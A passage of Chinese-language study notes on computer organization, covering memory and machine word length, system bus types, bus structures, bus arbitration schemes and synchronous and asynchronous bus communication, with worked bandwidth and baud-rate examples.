/><p><strong>存储体</strong>又包含<strong>存储单元</strong>和<strong>存储元件（0/1）</strong>。三者的关系依次对应于：大楼、房间、床位（无人/有人）。<strong>存储单元</strong>内存放一串二进制代码，每个存储单元被赋予一个地址号；<strong>存储字</strong>是存储单元内存放的二进制代码的组合，即存放不同的存储字；<strong>存储字长</strong>即存储字的位数，即一个字内有几个存储元件。</p><p>MAR是存储器地址寄存器，反映存储单元的个数。MDR是存储器数据寄存器，反映存储字长。若MAR=4，MDR=8，则有2<sup>4</sup>=16个存储单元，存储字长为8。</p><p>除了存储字长，还有一个机器字长需要区分：机器字长是CPU一次能处理数据的位数，与CPU中寄存器的位数有关。一般机器字长等于ALU（算术逻辑单元）和寄存器之间的数据传输宽度和寄存器的位数。</p><table><thead><tr><th>机器字长</th><th>存储字长</th></tr></thead><tbody><tr><td>机器字长通常指的是CPU一次性能处理的数据的位数。它是计算机体系结构的一个基本参数，决定了CPU内部运算和处理数据的能力。</td><td>存储字长是指存储系统中一次性能读写的数据的位数。它与存储设备的设计有关，如RAM的组织方式。</td></tr><tr><td>机器字长影响着CPU的寄存器大小、指令集的设计以及数据的宽度。例如，一个32位的CPU意味着其寄存器和大多数指令都是32位宽。</td><td>存储字长可以与机器字长相同，也可以不同。例如，一个32位的CPU可能使用16位的存储字长，这意味着每次读写操作涉及两个存储单元。</td></tr><tr><td>机器字长直接关系到计算机的寻址能力和数据处理能力。一个较长的机器字长通常意味着更高的性能和更复杂的计算能力。</td><td>存储字长影响数据的存储效率和访问速度。较长的存储字长可以减少读写操作的次数，提高数据访问速度。</td></tr></tbody></table><p>两者的主要区别在于它们的应用领域和影响范围：</p><ul><li>机器字长主要影响CPU的运算能力和指令集的设计。</li><li>存储字长主要影响数据的存储方式和访问效率。</li></ul><p>在实际应用中，机器字长和存储字长可能会相互影响。例如，如果存储字长小于机器字长，CPU在一次读写操作中无法获取或存储完整的机器字数据。这意味着CPU需要进行多次存储访问才能完成一次完整的数据传输，从而降低数据传输效率。反之，如果存储字长大于机器字长，每次存储访问都传输多于CPU实际需要的数据，可能导致资源浪费。例如，一个32位的CPU使用64位的存储字长，每次访问存储器都会传输64位的数据，但实际只处理32位的数据。</p><p>掌握这些概念后就可以计算存储容量了，如下图：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240616143832648.png" alt="image-20240616143832648" style="zoom:50%;" /><h2 id="第三章-系统总线"><a class="markdownIt-Anchor" href="#第三章-系统总线"></a> 第三章 系统总线</h2><blockquote><p>总线带宽需要会计算，每秒钟传送字节的个数，总线标准的概念了解，总线结构不要求会设计，但是要知道有什么优缺点。<br />总线判优，通信方式</p></blockquote><p>我们已经对计算机的结构有了一个初步的了解，接下来我们从总线部分开始入手，先从计算机的各个部件直接如何通信讲起。</p><h3 id="概念"><a class="markdownIt-Anchor" href="#概念"></a> 概念</h3><p>什么是总线？</p><p>总线是连接各个部件的信息传输线，是各个部件共享的传输介质。CPU通过总线来与其他部件进行通信。</p><h3 id="分类"><a class="markdownIt-Anchor" href="#分类"></a> 分类</h3><p>总线分为<strong>片内总线</strong>、<strong>系统总线</strong>和<strong>通信总线</strong>。</p><p>片内总线指芯片内部的总线，例如CPU内部各部件进行通信的总线。</p><p>系统总线则是计算机各部件之间的信息传输线</p><ul><li>数据总线，双向，与机器字长、存储字长有关。宽度代表CPU一次能传输数据的大小。</li><li>地址总线，单向，与存储地址、I/O地址有关。宽度代表CPU能寻址的范围大小。</li><li>控制总线，有出有入。宽度代表CPU能进行指令调控的能力大小。比如存储器读写指令、终端确认、总线允许等。</li></ul><p>通信总线指计算机系统之间或计算机系统与其他系统之间的通信，比如USB数据线，鼠标线等。</p><h3 id="性能指标"><a class="markdownIt-Anchor" href="#性能指标"></a> 性能指标</h3><p>总线的性能指标有许多，这里只介绍比较重要的几个：</p><ol><li>总线宽度：数据线的根数</li><li>总线带宽：每秒传输的最大<strong>字节</strong>数（MBps）</li></ol><blockquote><p>例题：总线工作频率为33MHz，总线宽度为32位，求总线带宽</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>33</mn><mo>×</mo><mo stretchy="false">(</mo><mn>32</mn><mo>÷</mo><mn>8</mn><mo stretchy="false">)</mo><mo>=</mo><mn>132</mn><mi>M</mi><mi>B</mi><mi>p</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">33×(32÷8)=132MBps</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">3</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">3</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">÷</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">8</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mord">3</span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord mathnormal">p</span><span class="mord mathnormal">s</span></span></span></span></p><p>总线宽度为32位，对应32/8=4个字节。工作频率为33MHz，即一秒内工作33M次，则每秒传输最大字节数为4Byte*33M=132MBps</p><p>细节：注意单位是MBps，即 <em>Million Byte per second</em>，每秒传输字节数（带宽）。</p></blockquote><h3 id="总线标准"><a class="markdownIt-Anchor" href="#总线标准"></a> 总线标准</h3><p>总线标准是指在计算机系统中用于数据传输的一组规范和协议，这些规范定义了数据如何在不同的硬件组件之间传输。这些协议对双方都是透明的，只要一方的设备按照标准实现了相应的接口，另一方就可以实现对接口的调用，而无须关系对方设备的具体细节（有点类似Go的接口哈）。</p><p>常见的总线标准有：PCI（现代计算机最常用的总线之一）、USB、SATA等。</p><p>更详细的内容就不介绍了，内容太多，请读者自行查阅资料扩展。</p><h3 id="总线结构"><a class="markdownIt-Anchor" href="#总线结构"></a> 总线结构</h3><p>这一节比较重要，虽然不要求设计，但是要掌握各个结构有什么优缺点。</p><h4 id="单总线结构"><a class="markdownIt-Anchor" href="#单总线结构"></a> 单总线结构</h4><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240616151609261.png" alt="image-20240616151609261" style="zoom:50%;" /><p>所有组件通过单一的总线连接，数据、地址和控制信号都通过这个总线传输。</p><ul><li>优点：设计简单，成本较低，适用于小型或简单的系统。</li><li>缺点：由于所有组件共享同一总线，因此<strong>数据传输速率受限</strong>，不适合高速或高容量的系统。</li></ul><h4 id="双总线结构"><a class="markdownIt-Anchor" href="#双总线结构"></a> 双总线结构</h4><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240616151918355.png" alt="image-20240616151918355" style="zoom:50%;" /><p>将速度较低的设备从总线上剥离下来，形成两个总线I/O设备种类很多，功能差距很大，速度差距也很大，CPU将一部分功能下放给通道，由通道对I/O统一管理。系统中存在两条总线，通常一条是主存总线（连接CPU和内存），另一条是I/O总线（连接外设）。</p><ul><li>优点：将CPU与内存的高速通信和I/O设备的通信分离，减少了总线争用，提高了整体性能。</li><li>缺点：需要桥接器或控制器在两个总线之间进行数据传输。</li></ul><h4 id="三总线结构"><a class="markdownIt-Anchor" href="#三总线结构"></a> 三总线结构</h4><p>三总线结构有两种形式，第一种：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240616153302977.png" alt="image-20240616153302977" style="zoom:50%;" /><p>特点是有一条主存总线用于CPU和主存的传输；I/O总线连接CPU和各种外设交换信息；DMA总线用于高速I/O设备（磁盘、磁带等）与主存交换信息。</p><ul><li>优点：比单总线结构来说加快了效率</li><li>缺点：在三总线结构中任一时刻只能使用一条总线，效率瓶颈</li></ul><p>第二种结构：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240616154443499.png" alt="image-20240616154443499" style="zoom:50%;" /><p>CPU和Cache（高速缓冲存储器）利用局部总线相连，Cache控制器将Cache连接到局部总线和系统总线上。主存通过Cache和CPU间接传递数据</p><p>主存与I/O设备传输不需要经过CPU，扩展总线将各个接口部件连接起来，每个接口又可以连一堆设备，扩展总线利用扩展总线接口与系统总线相连。</p><ul><li>优点：工作效率明显提高</li><li>缺点：设计更加复杂</li></ul><h4 id="四总线结构"><a class="markdownIt-Anchor" href="#四总线结构"></a> 四总线结构</h4><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240616155838820.png" alt="image-20240616155838820" style="zoom:50%;" /><p>增加一条高速总线。各个外设速度也并不相同，高速总线桥不用经过系统总线，使得这些高速设备与CPU关系更密切。</p><ul><li>优点：对高速设备而言，自身的工作可以更少依赖CPU，同时又比拓展总线上的低速设备更加靠近CPU，对于高性能设备和CPU来说，各自的效率将获得更大的提高。</li><li>缺点：实现更加复杂</li></ul><p>以下是关于单总线、双总线、三总线和四总线结构的总结表格：</p><table><thead><tr><th>总线结构</th><th>描述</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td><strong>单总线结构</strong></td><td><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240616151609261.png" alt="单总线结构" style="zoom:50%;" /></td><td>- 设计简单<br>- 成本较低<br>- 适用于小型或简单的系统</td><td>- 数据传输速率受限<br>- 不适合高速或高容量的系统</td></tr><tr><td><strong>双总线结构</strong></td><td><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240616151918355.png" alt="双总线结构" style="zoom:50%;" /></td><td>- 将CPU与内存的高速通信和I/O设备的通信分离<br>- 减少总线争用，提高整体性能</td><td>- 需要桥接器或控制器在两个总线之间进行数据传输</td></tr><tr><td><strong>三总线结构（第一种）</strong></td><td><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240616153302977.png" alt="三总线结构第一种" style="zoom:50%;" /></td><td>- 比单总线结构加快效率</td><td>- 在任一时刻只能使用一条总线，效率瓶颈</td></tr><tr><td><strong>三总线结构（第二种）</strong></td><td><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240616154443499.png" alt="三总线结构第二种" style="zoom:50%;" /></td><td>- 工作效率明显提高</td><td>- 设计更加复杂</td></tr><tr><td><strong>四总线结构</strong></td><td><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240616155838820.png" alt="四总线结构" style="zoom:50%;" /></td><td>- 高速设备与CPU关系更密切，效率更高<br>- 高性能设备和CPU的效率获得更大的提高</td><td>- 实现更加复杂</td></tr></tbody></table><h3 id="总线控制"><a class="markdownIt-Anchor" href="#总线控制"></a> 总线控制</h3><p>设备分有<strong>主设备</strong>和<strong>从设备</strong>两种模块。主设备对总线有控制权，从设备响应从主设备发来的总线命令。要实现总线控制设备，就需要解决多个主设备发出请求时的总线仲裁权分配问题。总线仲裁的原则是：<strong>优先权、公平性</strong>。优先权高的设备优先使用设备，优先权同级别的设备则按照时间先后来公平分配。</p><p>总线的判优控制分为两种，集中式和分布式。前者将逻辑控制集中在一处（比如CPU中），后者把逻辑控制分散在与总线相连的各个部件或设备上。</p><p>集中式包括：</p><ul><li>链式查询</li><li>计数器定时查询</li><li>独立请求方式</li></ul><p>分布式的特点是：</p><ul><li>自我选择：大家都把标志号放在总线上</li><li>碰撞检测：随便穿传，撞上了就重来，比如以太网</li></ul><h4 id="链式查询方式"><a class="markdownIt-Anchor" href="#链式查询方式"></a> 链式查询方式</h4><p>链式查询的结构图如下：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240616161557901.png" alt="image-20240616161557901" style="zoom:50%;" /><p>BR或实现，只要多于一个请求，BR就为1，但总线不在意哪个设备的请求。BG串行实现。BS总线忙，表示接口占用了总线。</p><p>BG的总线同意请求从第一个I/O接口开始依次往下传，如果有一个I/O接口请求使用总线，那么BG信号就停止往下传输，并且建立BS总线忙信号，表示它占用了总线。在链式查询中，离总线控制部门最近的设备拥有最高的优先级。</p><ul><li>优点：简单。只要很少的几根线就能实现总线控制，且很容易实现设备扩充，对电路故障敏感。</li><li>缺点：优先级低的设备很难获得总线使用权。</li></ul><h4 id="计数器定时查询方式"><a class="markdownIt-Anchor" href="#计数器定时查询方式"></a> 计数器定时查询方式</h4><p>结构图如下：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240616162129156.png" alt="image-20240616162129156" style="zoom:50%;" /><p>多了个设备地址线，少了总线同意线BG，当某个请求的接口的设备地址与计数器一致时，获得使用权。</p><p>在接收到BR总线请求时，总线控制设备中的计数器开始计数，并通过设备地址线，向各设备发出一组地址信号。当某个请求占用总线的设备地址与计数值一致时，获得总线使用权，终止计数查询。特点是：计数终止后，可以选择归零重新计数，这样就按照设备的优先级来分配使用权；也可以选择从上一次断点继续开始计数，此时所有设备的优先级相同。计数器的初始值还可以由程序设置，故优先次序也可以改变，</p><ul><li>优点：可以改变优先次序，比链式查询更加灵活。</li><li>缺点：实现更加复杂，对电路故障的敏感度不如链式查询。</li></ul><h4 id="独立请求方式"><a class="markdownIt-Anchor" href="#独立请求方式"></a> 独立请求方式</h4><p>结构如下：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240616163313158.png" alt="image-20240616163313158" style="zoom:50%;" /><p>独立请求即每个设备都有配套的BR请求线和BG同意线，总线控制部门内置一个排队电路，可以根据优先次序确定响应哪一台设备的请求。</p><ul><li>优点：响应速度快，优先次序控制更加灵活（可以用软件实现）</li><li>缺点：总线控制更加复杂，控制线数量多。链式查询中仅用两根线确定总线使用权属于哪个设备，计数器查询中使用log<sub>2</sub>n根线，而独立请求中要2n根线，其中n是允许接纳的最大设备数。</li></ul><h3 id="通信控制"><a class="markdownIt-Anchor" href="#通信控制"></a> 通信控制</h3><p>我们定义一个总线传输周期为完成一次总线操作的时间，一共有四个阶段：</p><ol><li>申请分配阶段：主模块申请，总线仲裁决定</li><li>寻址阶段：主模块向从模块给出地址和命令</li><li>传数阶段：主模块和从模块交换数据</li><li>结束阶段：主模块撤销有关信息，让出总线使用权</li></ol><p>解决了总线判优的逻辑后，接下来涉及到的就是具体的总线控制。通信控制主要解决双方如何获知传输开始和传输结束，以及双方如何协调配合。通常有四种方式：</p><ul><li>同步通信：由统一时标控制数据传送</li><li>异步通信：采用应答方式，没有公共时钟标准</li><li>半同步通信：同步和异步相结合</li><li>分离式通信：充分挖掘系统总线每个瞬间的动力</li></ul><h4 id="同步通信"><a class="markdownIt-Anchor" href="#同步通信"></a> 同步通信</h4><ul><li>优点：实现简单</li><li>缺点：<ol><li>总线上所有设备必须按相同的时钟频率工作，导致设备必然使用速度最慢的部件来设计公共时钟，严重降低了总线的工作效率</li><li>为防止时钟信号扭曲，高速工作时，总线距离必须足够短</li></ol></li></ul><blockquote><p>例题：假设总线时钟频率为100MHz，总线传输周期为4个时钟周期，总线宽度位32位，求总线数据传输率。</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>一个时钟周期</mtext><mo>:</mo><mn>1</mn><mi mathvariant="normal">/</mi><mn>100</mn><mi>M</mi><mi>H</mi><mi>z</mi><mo>=</mo><mn>0.01</mn><mi>u</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">一个时钟周期:1/100MHz=0.01us</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">钟</span><span class="mord cjk_fallback">周</span><span class="mord cjk_fallback">期</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">/</span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">0</span><span class="mord">1</span><span class="mord mathnormal">u</span><span class="mord mathnormal">s</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>总线传输周期</mtext><mo>:</mo><mn>0.01</mn><mi>u</mi><mi>s</mi><mo>×</mo><mn>4</mn><mo>=</mo><mn>0.04</mn><mi>u</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">总线传输周期:0.01us×4=0.04us</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">总</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">传</span><span class="mord cjk_fallback">输</span><span class="mord cjk_fallback">周</span><span class="mord cjk_fallback">期</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">0</span><span class="mord">1</span><span class="mord mathnormal">u</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">0</span><span class="mord">4</span><span class="mord mathnormal">u</span><span class="mord mathnormal">s</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>总线数据传输率</mtext><mo>:</mo><mo stretchy="false">(</mo><mn>32</mn><mo>÷</mo><mn>8</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>0.04</mn><mi>μ</mi><mi>s</mi><mo>=</mo><mn>100</mn><mi>M</mi><mi>B</mi><mi>p</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">总线数据传输率:(32÷8)/0.04μs=100MBps</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">总</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">据</span><span class="mord cjk_fallback">传</span><span class="mord cjk_fallback">输</span><span class="mord cjk_fallback">率</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">3</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">÷</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">8</span><span class="mclose">)</span><span class="mord">/</span><span class="mord">0</span><span class="mord">.</span><span class="mord">0</span><span class="mord">4</span><span class="mord mathnormal">μ</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord mathnormal">p</span><span class="mord mathnormal">s</span></span></span></span></p></blockquote><h4 id="异步通信"><a class="markdownIt-Anchor" href="#异步通信"></a> 异步通信</h4><p>采用应答方式。在主、从模块间增加两条应答线，主模块发送请求信号时，等到从模块返回响应信号后完成握手，再开始通信。</p><p>异步通信的应答方式又分为：不互锁、半互锁和全互锁三种：</p><ul><li>不互锁：请求过一段时间后，确认从模块已经收到请求信号，撤销请求信号，CPU先后将地址、写命令、数据全给出。向CPU主存写信息即这种方式</li><li>半互锁：请求信号必须等到收到回答信号才能撤销，多CPU访问共享存储器，必须未被占用，才能执行后续操作。在多机系统中CPU访问某个共享存储器。</li><li>全互锁：回答信号必须等到请求信号撤销后才能撤销。比如网络通信。</li></ul><blockquote><p>例题：假设每秒传输120个数据帧，字符格式规定1个起始位，8个数据位，1个校验位，1个终止位</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240616194751115.png" alt="image-20240616194751115" style="zoom:67%;" /><p>波特率：单位时间信号（或波形）改变状态的次数，单位为Baud（波特）</p><p>比特率：单位时间传递2进制数据的位数，单位为bps（位/秒）</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>一帧包含</mtext><mn>1</mn><mo>+</mo><mn>8</mn><mo>+</mo><mn>1</mn><mo>+</mo><mn>1</mn><mo>=</mo><mn>11</mn><mtext>位</mtext></mrow><annotation encoding="application/x-tex">一帧包含1+8+1+1=11位</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">帧</span><span class="mord cjk_fallback">包</span><span class="mord cjk_fallback">含</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">8</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord cjk_fallback">位</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>波特率：</mtext><mo stretchy="false">(</mo><mn>1</mn><mo>+</mo><mn>8</mn><mo>+</mo><mn>1</mn><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>×</mo><mn>120</mn><mo>=</mo><mn>1320</mn><mi>B</mi><mi>a</mi><mi>u</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">波特率：(1+8+1+1)×120=1320Baud</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">波</span><span class="mord cjk_fallback">特</span><span class="mord cjk_fallback">率</span><span class="mord cjk_fallback">：</span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">8</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">2</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">3</span><span class="mord">2</span><span class="mord">0</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord mathnormal">a</span><span class="mord mathnormal">u</span><span class="mord mathnormal">d</span></span></span></span></p><p>一帧包含11位，其中有效数据位为8位</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>比特率：</mtext><mn>8</mn><mo>×</mo><mn>120</mn><mo>=</mo><mn>960</mn><mi>b</mi><mi>p</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">比特率：8×120=960bps</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback">比</span><span class="mord cjk_fallback">特</span><span class="mord cjk_fallback">率</span><span class="mord cjk_fallback">：</span><span class="mord">8</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">2</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">9</span><span class="mord">6</span><span class="mord">0</span><span class="mord mathnormal">b</span><span class="mord mathnormal">p</span><span class="mord mathnormal">s</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>比特率：</mtext><mfrac><mn>8</mn><mn>11</mn></mfrac><mo>×</mo><mn>1320</mn><mi>B</mi><mi>a</mi><mi>u</mi><mi>d</mi><mo>=</mo><mn>960</mn><mi>b</mi><mi>p</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">比特率：\frac{8}{11}×1320Baud=960bps</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord cjk_fallback">比</span><span class="mord cjk_fallback">特</span><span class="mord cjk_fallback">率</span><span class="mord cjk_fallback">：</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">3</span><span class="mord">2</span><span class="mord">0</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord mathnormal">a</span><span class="mord mathnormal">u</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">9</span><span class="mord">6</span><span class="mord">0</span><span class="mord mathnormal">b</span><span class="mord mathnormal">p</span><span class="mord mathnormal">s</span></span></span></span></p></blockquote><h4 id="半同步通信"><a class="markdownIt-Anchor" href="#半同步通信"></a> 半同步通信</h4><p>半同步通信是同步和异步相结合。</p><p>同步方面：发送方用系统时钟前沿发送信号，接收方用系统时钟后延判断与识别。</p><p>异步方面：允许不同速度模块的和谐工作，增加了一条“等待”响应信号<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover 